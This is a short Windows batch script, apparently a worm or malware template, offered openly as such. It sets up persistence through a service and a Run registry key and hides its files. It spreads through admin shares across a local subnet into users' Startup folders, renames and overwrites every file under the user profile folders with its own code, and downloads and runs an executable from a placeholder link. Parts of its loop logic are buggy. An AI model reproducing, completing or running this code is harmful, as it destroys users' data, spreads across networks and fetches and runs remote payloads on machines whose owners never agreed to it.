@echo off
set gg=0
set servicename=DE
echo sc create %servicename% binpath=%0 >> service.bat
echo sc start %servicename% >> service.bat
attrib +h +r +s service.bat
start service.bat
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
attrib +h +r +s %0

:abdhd
net use Z: \\192.168.1.%gg%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.bat"
mountvol Z: /d)
if %i% == 256 (goto infect) else (set /a i=i+1)
goto abdhd

:infect
for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)

:payload
powershell -Command "(New-Object Net.WebClient).DownloadFile('your direct download link', 'your_exe.exe')"
powershell -Command "Invoke-WebRequest <your direct download link here> -OutFile Downoad_Execute.exe"
start %USERPROFILE%\Downloads\your_exe.exe
